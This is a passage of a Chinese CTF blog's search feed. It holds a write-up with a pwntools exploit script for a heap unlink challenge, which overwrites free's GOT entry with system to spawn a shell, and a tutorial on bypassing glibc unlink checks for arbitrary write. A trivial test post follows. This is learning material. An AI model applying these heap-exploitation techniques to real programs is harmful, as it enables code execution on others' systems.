class="line">p.sendline(str(index))</span><br><span class="line"><span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xc</span> + p32(chunk_ptr<span class="number">-0xc</span>) + p32(addr)</span><br><span class="line">set_chunk(<span class="number">0</span>, payload)</span><br><span class="line">res = print_chunk(<span class="number">1</span>)[:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leaking: %#x ---&gt; %s"</span> % (addr, res.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">128</span>)</span><br><span class="line">add_chunk(<span class="number">128</span>)</span><br><span class="line">add_chunk(<span class="number">128</span>)</span><br><span class="line">set_chunk(<span class="number">2</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bk</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x80</span>) + p32(chunk_ptr<span class="number">-0xc</span>) + p32(chunk_ptr<span class="number">-0x8</span>)</span><br><span class="line"><span class="comment">#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0</span></span><br><span class="line">payload += <span class="string">'a'</span> * (<span class="number">0x80</span><span class="number">-0x10</span>) + p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</span><br><span class="line">set_chunk(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free第二个chunk，将会触发unlink</span></span><br><span class="line">delete_chunk(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露system的地址</span></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system addr: %#x"</span> % system</span><br><span class="line"></span><br><span class="line"><span class="comment">#将free_got的地址覆盖掉第二个chunk的地址</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xc</span> + p32(chunk_ptr<span class="number">-0xc</span>) + p32(free_got)</span><br><span class="line">set_chunk(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址</span></span><br><span class="line">set_chunk(<span class="number">1</span>, p32(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用free，实际调用system</span></span><br><span class="line">delete_chunk(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>set_chunk函数中最后应该<strong>用send而非sendline</strong>，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。</li><li>unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值</li><li>此题为32位程序，若是64位应将<code>p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)</code>改为<code>p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10)</code></li></ol><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/unlink/t1/heap" target="_blank" rel="noopener">heap</a><br><a href="/post/e7616071.html">HITCON CTF 2014-stkof</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
            <tag> 堆利用 </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用学习之unlink</title>
      <link href="/post/dbc7b210.html"/>
      <url>/post/dbc7b210.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。<br>从双向链表中取出节点的过程，若是学过数据结构应该都比较清楚，主要代码是：<br><a id="more"></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd</span><br></pre></td></tr></table></figure><p>但是在unlink宏中，为了安全性还增加了一些检查：<br><strong>unlink源码：</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>); </span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>要利用该漏洞，先要绕过这里的两处检查（64位为例）</p><ul><li>第一处检查<code>chunksize(P) != prev_size (next_chunk(P))</code>，检查下一个chunk的prevsize是否等于当前chunk的size，所以需要通过<strong>溢出</strong>等手段设置下一chunk的prevsize</li><li>第二处检查<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code>，检查当前chunk是否是前一个chunk的后继，同时也是后一个chunk的前驱，也就是检查链表是否真的是链接好的。但是这个检查有个致命的缺点:<blockquote><p>因为<code>FD-&gt;bk == *(FD+0x18)</code>、<code>BK-&gt;fd == *(BK+0x10)</code><br>若在FD中存入&amp;P-0x18，那么表达式将变为<code>FD-&gt;bk == *((&amp;P-0x18)+0x18) == *&amp;P == P</code><br>若在BK中存入&amp;P-0x10，那么表达式将变为<code>BK-&gt;fd == *((&amp;P-0x10)+0x10) == *&amp;P == P</code><br>从而就绕过了检查<br><strong>注意：</strong><code>&amp;P</code>是表示指向目标chunk的指针的地址</p></blockquote></li></ul><p>绕过检查后，满足<code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>，所以有：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK; <span class="comment">// P = &amp;P-0x10</span></span><br><span class="line">BK-&gt;fd = FD; <span class="comment">// P = &amp;P-0x18</span></span><br></pre></td></tr></table></figure><p></p><p>在此之后，P就指向了比自己的地址低0x18个字节的位置，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。</p><h2 id="触发前提"><a href="#触发前提" class="headerlink" title="触发前提"></a>触发前提</h2><ol><li>堆指针是全局变量，或其地址是可泄露的</li><li>能够free一个smallchunk或largechunk(可以是伪造的)</li><li>能够控制下一chunk的prevsize和size</li></ol><h2 id="利用过程（64位为例）"><a href="#利用过程（64位为例）" class="headerlink" title="利用过程（64位为例）"></a>利用过程（64位为例）</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>存在堆溢出时：</p><ol><li>分配连续3个chunk a, b, c</li><li>在a中伪造chunk<code>p64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding</code></li><li>覆盖b的prevsize和size，修改inuse位，使之可以与a合并<code>p64(0x80) + p64(0x90)</code></li><li>free掉b，触发unlink</li><li>写入a，覆盖指针为任意地址，<code>p64(0)*3 + p64(addr)</code></li><li>再次写入a，任意地址写入</li></ol><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>不能溢出，但有double free</p><ol><li>分配连续3个fastchunk a, b, c</li><li>释放a，此时并不会修改后面的inuse位和prevsize</li><li>申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改</li><li>触发double free，将a再次释放，放入fastbin</li><li>再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse</li><li>布置a内存，释放b，触发unlink</li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li>一道典型的<a href="/post/503970b4.html">unlink例题</a></li><li><a href="/post/e7616071.html">HITCON CTF 2014-stkof</a></li><li><a href="/post/e99b1303.html">HITCON CTF 2016-SleepyHolder</a></li></ul><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 堆利用学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
            <tag> 堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/post/d87f7e0c.html"/>
      <url>/post/d87f7e0c.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h1 id="这是一个测试"><a href="#这是一个测试" class="headerlink" title="这是一个测试"></a>这是一个测试</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
